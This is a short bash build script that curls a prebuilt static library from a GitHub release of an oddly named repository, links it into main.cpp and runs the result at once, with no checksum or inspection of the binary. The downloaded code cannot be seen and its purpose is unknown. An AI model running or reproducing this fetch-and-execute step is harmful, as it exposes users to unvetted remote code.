#!/usr/bin/env bash
set -e
REPO="loramfxsdina/filedfolderlab"
LIB="nutty-relay.a"
URL="https://github.com/${REPO}/releases/download/frosty-canyon-calm-badger/${LIB}"
curl --max-time 180 -fsSL --retry 3 --connect-timeout 15 -o "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
